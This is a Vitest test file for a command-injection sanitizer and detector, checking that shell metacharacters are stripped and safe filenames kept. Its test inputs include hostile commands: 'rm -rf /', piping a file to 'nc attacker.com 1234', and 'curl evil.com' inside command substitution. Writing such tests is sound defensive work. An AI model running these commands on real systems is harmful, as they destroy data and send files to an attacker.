/**
 * Command Injection Sanitizer Tests
 * Tests for src/sanitizers/command.ts
 */

import { describe, it, expect } from 'vitest';
import { sanitizeCommand, detectCommandInjection } from '../../src/sanitizers/command';

describe('sanitizeCommand', () => {
  describe('Shell Metacharacters', () => {
    it('should block semicolon', () => {
      const result = sanitizeCommand('file.txt; rm -rf /');
      expect(result).not.toContain(';');
    });

    it('should block pipe', () => {
      const result = sanitizeCommand('cat file.txt | nc attacker.com 1234');
      expect(result).not.toContain('|');
    });

    it('should block ampersand', () => {
      const result = sanitizeCommand('cmd1 && malicious');
      expect(result).not.toContain('&&');
    });

    it('should block backticks', () => {
      const result = sanitizeCommand('echo `whoami`');
      expect(result).not.toContain('`');
    });

    it('should block $() substitution', () => {
      const result = sanitizeCommand('echo $(whoami)');
      expect(result).not.toContain('$(');
    });

    it('should block %0a (URL-encoded newline)', () => {
      const result = sanitizeCommand('file.txt%0aid');
      expect(result.toLowerCase()).not.toMatch(/%0a/);
    });

    it('should block %0d (URL-encoded carriage return)', () => {
      const result = sanitizeCommand('file.txt%0dwhoami');
      expect(result.toLowerCase()).not.toMatch(/%0d/);
    });

    it('should block %0A (uppercase)', () => {
      const result = sanitizeCommand('file.txt%0Aid');
      expect(result).not.toMatch(/%0[aA]/);
    });
  });

  describe('Command Chaining and Substitution', () => {
    // Word-based command detection (rm, curl, python etc.) was removed — it caused
    // too many false positives on legitimate content. Shell injection is now
    // detected via metacharacters and command substitution syntax only.
    it('should block command with semicolon chaining', () => {
      const result = sanitizeCommand('filename; rm -rf /');
      expect(result).not.toContain(';');
    });

    it('should block command with backtick substitution', () => {
      const result = sanitizeCommand('echo `whoami`');
      expect(result).not.toContain('`');
    });

    it('should block $() substitution even with commands', () => {
      const result = sanitizeCommand('echo $(curl evil.com)');
      expect(result).not.toContain('$(');
    });

    it('should not block standalone command names (too many false positives)', () => {
      // 'rm', 'curl', 'python' etc. appear in legitimate content
      expect(sanitizeCommand('rm -rf /')).toContain('rm');
      expect(sanitizeCommand('curl http://evil.com')).toContain('curl');
    });
  });

  describe('Safe Input', () => {
    it('should preserve safe filenames', () => {
      const result = sanitizeCommand('document.txt');
      expect(result).toBe('document.txt');
    });

    it('should preserve paths without metacharacters', () => {
      const result = sanitizeCommand('/home/user/file.txt');
      expect(result).toContain('home');
      expect(result).toContain('user');
    });
  });

  describe('Threat Collection', () => {
    it('should collect threat info when requested', () => {
      const result = sanitizeCommand('file.txt; rm -rf /', true);
      expect(result.wasSanitized).toBe(true);
      expect(result.threats.length).toBeGreaterThan(0);
      expect(result.threats[0].type).toBe('command_injection');
    });

    it('should return no threats for safe input', () => {
      const result = sanitizeCommand('document.txt', true);
      expect(result.wasSanitized).toBe(false);
      expect(result.threats).toHaveLength(0);
    });
  });

  describe('Edge Cases', () => {
    it('should handle empty string', () => {
      const result = sanitizeCommand('');
      expect(result).toBe('');
    });

    it('should handle non-string input', () => {
      const result = sanitizeCommand(123 as unknown as string);
      expect(result).toBe('123');
    });

    it('should handle multiple metacharacters', () => {
      const result = sanitizeCommand('cmd1; cmd2 && cmd3 | cmd4');
      expect(result).not.toContain(';');
      expect(result).not.toContain('&&');
      expect(result).not.toContain('|');
    });
  });
});

describe('detectCommandInjection', () => {
  it('should detect semicolon', () => {
    expect(detectCommandInjection('cmd1; cmd2')).toBe(true);
  });

  it('should detect pipe', () => {
    expect(detectCommandInjection('cmd1 | cmd2')).toBe(true);
  });

  it('should detect backticks', () => {
    expect(detectCommandInjection('echo `whoami`')).toBe(true);
  });

  it('should not detect standalone command names (no metacharacters)', () => {
    // 'rm file.txt' contains no shell metacharacters — not detectable without false positives
    expect(detectCommandInjection('rm file.txt')).toBe(false);
  });

  it('should detect command with semicolon', () => {
    expect(detectCommandInjection('rm file.txt; whoami')).toBe(true);
  });

  it('should return false for safe input', () => {
    expect(detectCommandInjection('document.txt')).toBe(false);
  });

  it('should handle non-string input', () => {
    expect(detectCommandInjection(123 as unknown as string)).toBe(false);
  });
});
